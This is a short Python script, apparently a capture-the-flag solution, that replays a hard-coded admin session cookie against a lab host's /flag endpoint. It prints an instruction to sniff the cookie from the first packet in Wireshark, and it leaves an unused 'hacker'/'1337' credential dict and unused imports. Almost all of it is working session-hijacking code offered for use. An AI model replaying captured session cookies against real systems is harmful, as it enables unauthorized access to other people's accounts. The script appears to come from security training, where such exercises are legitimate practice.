#!/usr/bin/python3

import requests  
import subprocess
import time

headers= {
"Cookie":"session=eyJ1c2VyIjoiYWRtaW4ifQ.am88mQ.pp58SKLBb2BkQUUknfadAKgI5qA"
}
data = {
"username":"hacker",
"password":"1337"
}
print("Frist open the wireshark and get the cookie in first packet using follow tcp stream")
res = requests.get('http://10.0.0.2/flag',headers=headers)

print(res.text)
